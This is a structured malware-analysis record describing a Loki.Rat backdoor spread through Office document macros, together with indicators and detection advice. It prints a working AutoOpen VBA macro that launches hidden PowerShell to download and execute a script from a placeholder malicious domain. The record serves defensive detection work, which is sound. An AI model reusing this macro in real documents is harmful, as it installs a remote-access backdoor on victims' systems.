package_info.package_manager: N/A (malicious macro dropper in Office documents)
package_info.why_malicious: Loki.Rat is a backdoor malware delivered via malicious Office document macros. Upon opening the document, the macro executes a hidden PowerShell command that downloads and runs a remote script, resulting in the installation of the Loki.Rat backdoor. This enables remote attacker access, data exfiltration, and system control, representing a severe compromise of the infected system.

execution_context.trigger: On document open (macro execution via AutoOpen event)
execution_context.file_location: Embedded macro within malicious Office document (e.g., .doc, .xls)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim obj As Object
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/loki.ps1')"
End Sub
malicious_snippets.code_behavior: On document open, the macro uses Wscript.Shell to spawn a hidden PowerShell process, which downloads and executes a remote script from 'http://malicious-domain.com/loki.ps1', resulting in the installation of the Loki.Rat backdoor and enabling remote attacker control.

malice_analysis.why_suspicious: The macro leverages the AutoOpen event to automatically execute code when the document is opened, and uses Wscript.Shell to launch PowerShell, which then downloads and executes code from an external, untrusted domain. This is a well-known technique for delivering malware and is rarely, if ever, used in legitimate Office documents.
malice_analysis.violated_expectations: Legitimate Office documents should not execute external processes or download and run code from the internet upon opening. The use of AutoOpen macros to trigger PowerShell for remote code execution is a clear deviation from normal document behavior.
malice_analysis.similar_legitimate_use: In rare, highly controlled enterprise environments, macros may automate trusted internal tasks, but they should never download and execute code from external sources.
key_indicators: Presence of AutoOpen macro that triggers on document open
Use of CreateObject("Wscript.Shell") to launch external processes
PowerShell command with hidden window execution
DownloadString method fetching code from an external domain
Execution of remote script via IEX (Invoke-Expression)

attack_chain.action: Victim opens the malicious Office document, triggering the embedded AutoOpen macro.
attack_chain.leads_to: Macro execution initiates a hidden PowerShell process.

attack_chain.action: The PowerShell process downloads and executes the remote Loki.Rat backdoor payload from 'http://malicious-domain.com/loki.ps1'.
attack_chain.leads_to: Loki.Rat is installed, establishing remote access for the attacker and enabling data exfiltration and system control.

behavioral_signatures: Office process (e.g., winword.exe, excel.exe) spawning PowerShell or cmd.exe
PowerShell process executing DownloadString and IEX to fetch and run remote scripts
AutoOpen or Document_Open macros that invoke Wscript.Shell or similar objects
Unusual child process creation from Office applications
file_indicators: Office documents containing embedded macros with AutoOpen or Document_Open events
Macro code referencing external domains or URLs (e.g., 'http://malicious-domain.com/loki.ps1')
Presence of CreateObject("Wscript.Shell") in macro code
network_indicators: Outbound HTTP/HTTPS requests to 'http://malicious-domain.com/loki.ps1' or other suspicious domains from Office or PowerShell processes
Network connections initiated by PowerShell processes shortly after Office document open events
detection_knowledge.how_to_detect: Monitor for Office processes (such as winword.exe or excel.exe) spawning PowerShell or cmd.exe, especially when followed by network activity to untrusted or known malicious domains. Scan Office documents for macros containing AutoOpen or Document_Open events that use Wscript.Shell or similar objects to launch external processes. Flag documents where macro code references external URLs or domains. Correlate process creation events with network connections to identify suspicious download and execution patterns.
